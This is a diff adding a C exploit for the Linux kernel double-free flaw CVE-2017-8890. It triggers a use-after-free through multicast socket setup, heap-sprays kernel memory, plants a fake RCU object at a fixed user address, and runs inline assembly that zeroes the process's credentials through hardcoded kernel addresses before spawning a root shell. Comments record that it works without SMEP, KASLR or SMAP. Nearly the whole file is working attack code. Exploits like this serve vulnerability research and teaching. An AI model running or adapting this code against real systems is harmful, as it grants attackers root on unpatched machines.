@@ -1,0 +1,357 @@
+/*
+step3 on 20180716 @ thinkycx 
+success to getroot with no smep  no kaslr no smap
+deficiency：
+    1. heap spray is not stable
+    2. heap spray can only modify iml first 8 byte to 0x1000000a and kernel might oops because iml+0x18 is not null
+    3. cannot debug it because nxtlist[RCU_NEXT_TAIL] will be modified and  the rcu thread cannot access 0x10000000a+0x20
+
+*/
+// modify beraphin CVE-2017-8890.cpp
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/select.h>  
+#include <sys/socket.h>  
+#include <arpa/inet.h>  
+#include <netdb.h> 
+#include <string.h> 
+#include <unistd.h> 
+#include <netinet/in.h> 
+#include <fcntl.h> 
+#include <time.h> 
+#include <sys/types.h>
+#include <pthread.h>
+#include <net/if.h>
+#include <errno.h>
+#include <assert.h>
+#include <sys/mman.h>
+#include <stdbool.h> 
+
+#define HELLO_WORLD_SERVER_PORT    6666 
+#define LENGTH_OF_LISTEN_QUEUE 1
+#define BUFFER_SIZE 1024
+#define FILE_NAME_MAX_SIZE 512
+bool server_init=false;
+bool server_finish=false;
+bool client_finish=false;
+
+#define SPRAY_TIMES 48000 /* spray for the hole. */
+static int ipv6_fd[SPRAY_TIMES]={0};
+struct group_req gr_spray = {};
+struct sockaddr_in6 in6_spray = {};
+// #define FAKE_NEXT_RCU 0xc0000ff
+#define FAKE_NEXT_RCU 0x000000010000000a
+bool getroot_finish=false;
+int pid = -1;
+
+
+void init_spray()
+{
+    for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
+        if ((ipv6_fd[i] = socket(AF_INET6, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP)) < 0) {
+            printf("[init_spray] %d, socket() failed.", i);
+            perror("Socket");
+           exit(errno);
+        }
+
+    }
+}
+
+// static int prepare_spray_obj(int fd, // 堆喷射 实现函数
+//     struct group_req* gr_spray_ptr, 
+//     struct sockaddr_in6* in6_spray_ptr, unsigned c)
+// {
+//     gr_spray_ptr->gr_interface = 1;
+//     in6_spray_ptr->sin6_family = AF_INET6;  // 初始化  sin6_family
+//     int8_t addr[16] = "\xff\x00\x00\x0c\x00\x00\x00\x00\x00\x00"; // 初始化  sin6_addr 劫持到用户态地址。
+//     *(unsigned long*)&addr[8] = c+0xabcd000000000000;
+//     memcpy(&in6_spray_ptr->sin6_addr, addr, sizeof(addr));
+//     memcpy(&gr_spray_ptr->gr_group, in6_spray_ptr, sizeof(*in6_spray_ptr));
+//     // printf("--------prepare_spray_obj  now  time is %d---------\n",c );
+    
+//     setsockopt(fd, SOL_IPV6, 0x2a, gr_spray_ptr, sizeof(*gr_spray_ptr));       //setsockopt 这个函数会kmalloc ------------------
+// }
+
+// void start_spray(){
+//     for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
+//         prepare_spray_obj(ipv6_fd[i], &gr_spray, &in6_spray, i);
+//         if(i%4000 ==0 ){
+//             printf("spraytimes - %d |",i);
+//         }
+//     }
+
+// }
+
+
+static int prepare_spray_obj(int i)
+{
+    struct ip_mreq_source mreqsrc;
+    memset(&mreqsrc,0,sizeof(mreqsrc));
+    mreqsrc.imr_multiaddr.s_addr = htonl(inet_addr("10.10.2.224"));
+
+    setsockopt(ipv6_fd[i], IPPROTO_IP, IP_ADD_SOURCE_MEMBERSHIP, &mreqsrc, sizeof(mreqsrc));
+
+}
+
+void start_spray(){
+    for ( int i = 0; i < SPRAY_TIMES ; i++ ) {
+        prepare_spray_obj(i);
+        if(i%4000 ==0 ){
+            printf("spraytimes - %d |",i);
+        }
+    }
+
+}
+
+/*
+ffffffff810aba10 T prepare_kernel_cred
+ffffffff810ab620 T commit_creds
+
+ffffffff810a6410 T find_get_pid
+ffffffff810a6360 T pid_task
+*/
+
+unsigned long*  find_get_pid = (unsigned long*)0xffffffff810a6410;
+unsigned long*  pid_task     = (unsigned long*)0xffffffff810a6360;
+
+
+
+void get_root() {
+        asm(
+        "sub    $0x18,%rsp;"
+        "mov    pid,%edi;"
+        "callq  *find_get_pid;"
+        "mov    %rax,-0x8(%rbp);"
+        "mov    -0x8(%rbp),%rax;"
+        "mov    $0x0,%esi;"
+        "mov    %rax,%rdi;"
+        "callq  *pid_task;"
+        "mov    %rax,-0x10(%rbp);"
+        //"callq  *%rax;" // 用来看rax的值 看看获取的task_struct是不是一个内核态的地址，如果是 说明0x5f8可能有问题
+        "mov    -0x10(%rbp),%rax;"
+        "mov    0xa28(%rax),%rax;"          
+        //"mov    0x5f8(%rax),%rax;"
+        "mov    %rax,-0x18(%rbp);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0x4,%rax;"
+        "movl   $0x0,(%rax);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0x8,%rax;"
+        "movl   $0x0,(%rax);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0xc,%rax;"
+        "movl   $0x0,(%rax);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0x10,%rax;"
+        "movl   $0x0,(%rax);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0x14,%rax;"
+        "movl   $0x0,(%rax);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0x18,%rax;"
+        "movl   $0x0,(%rax);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0x1c,%rax;"
+        "movl   $0x0,(%rax);"
+        "mov    -0x18(%rbp),%rax;"
+        "add    $0x20,%rax;"
+        "movl   $0x0,(%rax);"
+        "nop;"
+        "leaveq;" 
+        "retq   ;");
+}
+
+void *modify_func(){ 
+    printf("modify_func success...get_root @ %p\n",&get_root);
+    printf("modify_func success...get_root @ %p\n",get_root);
+
+    unsigned long fix_ebp_addr = FAKE_NEXT_RCU + 8*3;
+    unsigned long fix_func_addr = FAKE_NEXT_RCU + 8*5;
+    // unsigned long func = (unsigned long)0xdeadbeef;
+    unsigned long ebp = (unsigned long)0x0;
+    unsigned long func = (unsigned long)get_root;
+    
+    printf("modify_func success...func @ %p\n",(unsigned long *)func);
+    while(1) {
+        *(unsigned long *)(fix_ebp_addr) = ebp;    
+        *(unsigned long *)(fix_func_addr) = func;    
+    }
+}
+//#include <sys/mman.h>
+static void init_fake_obj()
+{
+    void *addr_mmap = FAKE_NEXT_RCU-0xa;
+    if ( mmap((void *)addr_mmap, 4096, PROT_READ|PROT_WRITE, 
+         MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) < 0 )
+         err(-1, "mmap at %p failed.", addr_mmap);
+    unsigned long *addr_next_rcu = (unsigned long *)FAKE_NEXT_RCU;
+    unsigned long func = (unsigned long)0xdeadbeafdeadbeaf;
+
+    addr_next_rcu[0] = 0x0;
+    addr_next_rcu[1] = 0x0a0a02e0;
+    addr_next_rcu[2] = 0x00000002;
+    addr_next_rcu[3] = 0x0;
+    addr_next_rcu[4] = 0x0;
+    addr_next_rcu[5] = func;
+
+    pthread_t id_func_modify;
+	pthread_create(&id_func_modify,NULL,modify_func,NULL);    
+}
+
+void *server(void *arg)
+{
+    struct sockaddr_in server_addr;
+    bzero(&server_addr,sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = htons(INADDR_ANY);
+    server_addr.sin_port = htons(HELLO_WORLD_SERVER_PORT);
+
+    struct	group_req group = {0};
+    struct sockaddr_in *psin;
+
+	psin = (struct sockaddr_in *)&group.gr_group;
+    psin->sin_family = AF_INET;
+    psin->sin_addr.s_addr = htonl(inet_addr("10.10.2.224"));
+
+    int server_socket = socket(AF_INET,SOCK_STREAM,0);
+    if( server_socket < 0)
+    {
+        printf("[Server]Create Socket Failed!\n");
+        exit(1);
+    }
+    // { 
+	   // int opt =1;
+    //    //IPPROTO_IP
+       setsockopt(server_socket, SOL_IP, MCAST_JOIN_GROUP, &group, sizeof (group));
+    // }
+
+    if( bind(server_socket,(struct sockaddr*)&server_addr,sizeof(server_addr)))
+    {
+        printf("[Server]Server Bind Port : %d Failed!\n", HELLO_WORLD_SERVER_PORT); 
+        exit(1);
+    }
+
+        
+    if ( listen(server_socket, LENGTH_OF_LISTEN_QUEUE) )
+   {
+       printf("[Server]Server Listen Failed!\n"); 
+       exit(1);
+    }
+
+    struct sockaddr_in client_addr;
+    socklen_t length = sizeof(client_addr);
+ 
+ 	server_init=true;
+    printf ("[Server]accept..... \n"); 
+    int new_server_socket = accept(server_socket,(struct sockaddr*)&client_addr,&length);
+    if ( new_server_socket < 0)
+    {
+        close(server_socket);
+        printf("[Server]Server Accept Failed!\n");
+        return NULL;
+    }
+        
+    printf("[Server]sleep 1s and close new_server_socket...[Attention] first free!...\n");
+    sleep(1);
+    // [1] SPRAY PREPARE
+    init_spray();
+    // 
+    close(new_server_socket);
+    //there must be a period between 2 close()???? 
+
+    printf("[Server] sleep 5s to wait kfree_rcu...\n");
+    sleep(5);
+
+    // start_spray();
+    
+    printf("[Server] start spray...\n");
+    // START SPRAY
+    start_spray();
+
+    // trigger
+    printf("[Server]sleep 1s and close server_socket..[Attention] second free!...\n");
+    printf("[Server] now pid %d\n", pid);
+    sleep(1);
+    close(server_socket);
+
+    printf("[Server]sleep 10s and getroot...\n");
+    sleep(10);
+
+	server_finish=true;
+
+    printf("[server]get_root triggered done!!!!\n");
+    printf("[server] current uid is : %d \n", getuid());
+    printf("[server] current euid is : %d \n", geteuid());
+
+    system("/bin/sh");
+
+    return NULL;
+}
+void *client(void *arg){
+	struct sockaddr_in client_addr;
+	bzero(&client_addr,sizeof(client_addr));
+	client_addr.sin_family=AF_INET;
+	client_addr.sin_addr.s_addr=htons(INADDR_ANY);
+	client_addr.sin_port=htons(0);
+	int client_socket=socket(AF_INET,SOCK_STREAM,0);
+	if(client_socket<0){
+		printf("[Client]Create socket failed!\n");
+		exit(1);
+	}
+	if(bind(client_socket,(struct sockaddr*)&client_addr,sizeof(client_addr))){
+		printf("[Client] client bind port failed!\n");
+		exit(1);
+	}
+	struct sockaddr_in server_addr;
+	bzero(&server_addr,sizeof(server_addr));
+	server_addr.sin_family=AF_INET;
+	if(inet_aton("127.0.0.1",&server_addr.sin_addr)==0){
+        /*
+        int inet_aton(const char *cp, struct in_addr *inp);
+        inet_aton() converts the Internet host address cp from the IPv4 numbers-and-dots notation into \
+            binary form (in network byte order) and stores it in the structure that inp points to. 
+        */
+		printf("[Client]Server IP Address error\n");
+		exit(0);
+	}
+	server_addr.sin_port=htons(HELLO_WORLD_SERVER_PORT);
+	socklen_t server_addr_length=sizeof(server_addr);
+	if(connect(client_socket,(struct sockaddr*)&server_addr,server_addr_length)<0){
+		printf("[Client]cannot connect to 127.0.0.1!\n");
+		exit(1);
+	}
+	printf("[Client]Close client socket...\n");
+	close(client_socket);
+
+    client_finish=true;
+	return NULL;
+
+}
+
+int main(int argc,char* argv[])
+{	
+    pid = getpid();
+    printf("[main] now pid %d\n", pid);
+    printf("[main] current uid is : %d \n", getuid());
+    printf("[main] current euid is : %d \n", geteuid());
+    init_fake_obj();
+	pthread_t id_server, id_client;
+	pthread_create(&id_server,NULL,server,NULL);
+	while(!server_init){
+		sleep(1);
+	}
+    printf("server init success...\n");
+
+	pthread_create(&id_client,NULL,client,NULL);
+	while(!client_finish){
+        printf("[main] client finish\n");
+        break;
+	}	
+    while(!server_finish){
+        printf("[main] server finish...sleep 3s \n");
+        sleep(3);
+	}
+    wait();
+
+	return 0;
+}
